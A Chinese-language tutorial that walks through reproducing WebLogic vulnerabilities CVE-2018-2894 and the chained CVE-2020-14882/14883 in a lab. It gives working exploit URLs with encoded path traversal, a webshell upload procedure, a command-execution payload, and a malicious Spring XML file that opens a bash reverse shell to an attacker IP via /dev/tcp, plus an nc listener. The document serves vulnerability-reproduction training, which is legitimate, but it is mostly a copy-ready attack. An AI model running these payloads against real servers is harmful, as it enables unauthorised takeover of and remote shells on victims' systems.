#### Weblogic是美国Oracle公司出品的一个应用服务器(application server)，一个基于java
EE的中间件，用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。本文主要介绍几个常见weblogic漏洞，希望刚入门的同行可以学习到如何对漏洞进行复现的方式方法。

## 一、CVE-2018-2894漏洞复现

### 0x01 CVE-2018-2894漏洞简介

Weblogic管理端未授权的两个页面存在任意文件上传漏洞，通过这两个页面可以获取到服务器权限。这两个页面分别是/ws_utc/begin.do，/ws_utc/config.do。利用这两个页面可以上传任意jsp文件,从而获取到服务器权限。

### 0x02CVE-2018-2894影响版本

漏洞影响版本:

Weblogic 10.3.6.0

Weblogic 12.1.3.0

Weblogic 12.2.1.2

Weblogic 12.2.1.3

### 0x03 CVE-2018-2894漏洞环境搭建

此漏洞环境WebLogic Server 版本:
12.2.1.3.0。漏洞环境搭建步骤如下:![1647850202_623832dad1f6c6c00f086.png!small?1647850202669](https://image.3001.net/images/20220321/1647850202_623832dad1f6c6c00f086.png!small?1647850202669)

步骤一:导入tgz包。命令行内输入命令: docker load -i weblogic.tgz。如图1所示。

![1647850224_623832f009a55870ea9a2.png!small?1647850223851](https://image.3001.net/images/20220321/1647850224_623832f009a55870ea9a2.png!small?1647850223851)

图1docker导入tgz包

步骤二:运行环境。命令行内输入命令:docker run -d -p 7001:7001 -p 8055:8055 1f4。如图2所示。

![1647850244_6238330473f6852df7379.png!small?1647850244206](https://image.3001.net/images/20220321/1647850244_6238330473f6852df7379.png!small?1647850244206)

图2运行环境

步骤三:检查环境是否正常运行。命令行内输入:docker ps。如图3所示。

![1647850277_6238332572579a206215d.png!small?1647850277174](https://image.3001.net/images/20220321/1647850277_6238332572579a206215d.png!small?1647850277174)

图3检查环境是否正常运行

步骤四:访问weblogic页面。浏览器url内输入http://127.0.0.1:7001/console。如图4所示。

![1647850461_623833dd9fdd779ff324e.png!small?1647850461440](https://image.3001.net/images/20220321/1647850461_623833dd9fdd779ff324e.png!small?1647850461440)

图4weblogic页面

### 0x04 CVE-2018-2894漏洞利用

本例通过config.do页面上传webshell,具体操作步骤如下:

步骤一:访问/ws_utc/config.do页面。浏览器内输入链接:http://192.168.8.129:700

1/ws_utc/config.do。如图5所示。

![1647850561_6238344124fd0e688d14b.png!small?1647850560867](https://image.3001.net/images/20220321/1647850561_6238344124fd0e688d14b.png!small?1647850560867)

图5配置工作目录页面

步骤二:修改当前的工作目录。修改Work Home Dir为:

/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css

修改完成后,点击提交,如图6所示。

![1647850580_623834545049937bb3f36.png!small?1647850579994](https://image.3001.net/images/20220321/1647850580_623834545049937bb3f36.png!small?1647850579994)

图6 修改Work Home Dir

步骤三:点击页面内安全按钮,点击以后如图7所示。

![1647850618_6238347a0eef00b12343d.png!small?1647850617754](https://image.3001.net/images/20220321/1647850618_6238347a0eef00b12343d.png!small?1647850617754)

图7安全页面

步骤四:点击页面内添加按钮。如图8所示。

![1647850634_6238348aa6549110b6171.png!small?1647850634383](https://image.3001.net/images/20220321/1647850634_6238348aa6549110b6171.png!small?1647850634383)

图8 添加Keystore设置

步骤五:上传冰蝎木马。首先需要先对Keystore设置页面进行配置,配置如下:

  * 设置名字配置:内容可随意填写,本例填写为he
  * Keystore密码配置:此处内容可填可不填,本例不进行填写。
  * Keystore文件配置:此处上传文件为jsp木马,本例上传的木马为冰蝎木马。

上述配置完成后,先不要点击提交进行上传。如图9所示

![1647850656_623834a0b2a68413f6c6a.png!small?1647850656447](https://image.3001.net/images/20220321/1647850656_623834a0b2a68413f6c6a.png!small?1647850656447)

图9 Keystore设置

步骤六:按下F12在弹出来的页面中,点击网络按钮。如图10所示。

![1647850690_623834c227cd30145a142.png!small?1647850689842](https://image.3001.net/images/20220321/1647850690_623834c227cd30145a142.png!small?1647850689842)

图10网络页面

步骤七:查看响应,找到时间戳。此时点击提交图8-页面中的提交按钮。在网络页面内先找到此时的网络请求,然后选中响应找到文件上传的时间戳,本例中的时间戳为16263202

73252，如图11所示。

![1647850705_623834d185cbaf78d22fe.png!small?1647850705240](https://image.3001.net/images/20220321/1647850705_623834d185cbaf78d22fe.png!small?1647850705240)

图11时间戳

在看响应时也可通过Burp Suite抓包的方式,查看响应数据包,找到时间戳。如图12所示。

![1647850743_623834f79d70e42592cb4.png!small?1647850743347](https://image.3001.net/images/20220321/1647850743_623834f79d70e42592cb4.png!small?1647850743347)

图12 时间戳

步骤八:木马上传成功后会进行重命名,通过获取GET请求中的timestamp参数作为后续木马文件名中的一部分，此时木马的名字为”时间戳_木马名”。那么本例中上传的木马名字应该为:
1626320273252_shell.jsp。木马连接地址为：http://192.168.8.129:7001/ws_utc/css/config/keystore/1626320273252_shell.jsp

如图13所示。

![1647850764_6238350c1236a1e786def.png!small?1647850763758](https://image.3001.net/images/20220321/1647850764_6238350c1236a1e786def.png!small?1647850763758)

图13木马连接地址

步骤八:使用冰蝎连接冰蝎木马。连接成功后如图14所示。

![1647850776_62383518ac37c59ef9e7b.png!small?1647850776587](https://image.3001.net/images/20220321/1647850776_62383518ac37c59ef9e7b.png!small?1647850776587)

图14 文件管理页面

## 二、 weblogic漏洞综合利用

主要以CVE-2020-14882漏洞和CVE-2020-14883配合利用为主,通过本文章应当掌握这两种漏洞的利用方式。具体操作步骤如下。

### 0x01漏洞简介

CVE-2020-14882漏洞简介：远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic 管理控制台。

CVE-2020-14883漏洞简介：允许后台任意用户通过HTTP协议执行任意命令。

可以将上述两个漏洞进行组合，发挥各自漏洞的特性,将漏洞伤害扩大化。利用时可通过一个HTTP请求在Weblogic服务器上以未授权的任意用户身份执行任意命令。

### 0x02影响版本

漏洞影响版本:

Weblogic 10.3.6.0.0

Weblogic 12.1.3.0.0

Weblogic 12.2.1.3.0

Weblogic 12.2.1.4.0

Weblogic 14.1.1.0.0

### 0x03漏洞环境搭建

此漏洞环境和任务一所使用漏洞环境一样,不需要再进行搭建,可使用任务一的漏洞环境进行实验。

漏洞实验环境简介:

漏洞靶机IP: 192.168.8.129

远程web服务器IP: 192.168.8.116

攻击机器IP: 192.168.8.105

漏洞靶机IP即漏洞环境所在服务器IP,远程web服务器上放置了恶意文件shell.xml文件,攻击机器IP即攻击时所使用的机器，本例中的攻击者机器使用的为kali
linux。三台实验机器均可使用Vmware搭建,保证其网络互通性即可

### 0x04漏洞综合利用

步骤一:验证未授权访问(CVE-2020-14882)。浏览器内访问以下链接:

http://192.168.8.129:7001/console/css/%252e%252e%252fconsole.portal 如图15所示。

![1647850945_623835c1c801078c3c615.png!small?1647850945617](https://image.3001.net/images/20220321/1647850945_623835c1c801078c3c615.png!small?1647850945617)

图15管理后台页面

此时访问的用户为较低权限的用户,无法执行任意代码以及安装应用,需要和CVE-2020-14883漏洞组合利用。结合CVE-2020-14883漏洞,可以构造特殊的HTTP请求,能够在未经身份验证的情况下在weblogic服务器上执行任意代码。

CVE-2020-14883漏洞一共有两种利用方法。

方法一:通过com.tangosol.coherence.mvel2.sh.ShellSession。

方法二:通过com.bea.core.repackaged.springframework.context.support .FileSystemXml

ApplicationContext。

第一种方法只能在Weblogic 12.2.1以上版本利用。第二种方法是一种更为通杀的方法,对所有Weblogic版本均有效。

步骤二:此漏洞环境Weblogic版本为12.2.1.3.0,可以使用方法一。url内访问如下连接:

http://192.168.8.129:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(“java.lang.Runtime.getRuntime().exec('mkdir
/tmp/22');”)。访问此连接后页面显示,如图16所示。

![1647850976_623835e006cbde70ec2bb.png!small?1647850975714](https://image.3001.net/images/20220321/1647850976_623835e006cbde70ec2bb.png!small?1647850975714)

图16访问连接后页面显示

虽然页面显示为404,但是命令mkdir /tmp/22应当是执行成功了。

步骤三:进入docker漏洞环境,输入命令ls /tmp。如图17所示,命令执行成功。

![1647850994_623835f21df5c4c79fc8a.png!small?1647850993818](https://image.3001.net/images/20220321/1647850994_623835f21df5c4c79fc8a.png!small?1647850993818)

图17验证命令执行成功

步骤四:构造一个XML文件,将其保存在Weblogic漏洞环境可以访问到的服务器上,本例中此文件名字为shell.xml。构造好的XML文件可通过访问,让Weblogic加载此文件,并且执行XML内的命令。XMl文件内容如下所示:

<?xml version="1.0" encoding="UTF-8" ?>

<beans xmlns="http://www.springframework.org/schema/beans"

xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"

xsi:schemaLocation="http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd">

<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">

<constructor-arg>

<list>

<value>bash</value>

<value>-c</value>

<value><![CDATA[bash -i >& /dev/tcp/192.168.8.105/6666 0>&1]]></value>

</list>

</constructor-arg>

</bean>

</beans>

步骤五:打开nc进行监听，命令行内输入nc -lvnp 6666。如图18所示。

![1647851015_623836078e1bd7049f2a8.png!small?1647851015228](https://image.3001.net/images/20220321/1647851015_623836078e1bd7049f2a8.png!small?1647851015228)

图18 nc监听6666端口

nc是一款端口转发工具,kali中自带此工具,windows中则需要安装。

步骤六:访问构造好的连接,链接如下所示:

http://192.168.8.129:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://192.168.8.116/shell.xml")

此时,在nc运行的主机上成功接收到反弹的shell,可以在命令框内输入一些命令进行操作,如图19所示。

![1647851036_6238361c9440d863b379e.png!small?1647851036478](https://image.3001.net/images/20220321/1647851036_6238361c9440d863b379e.png!small?1647851036478)

图19成功反弹shell

  

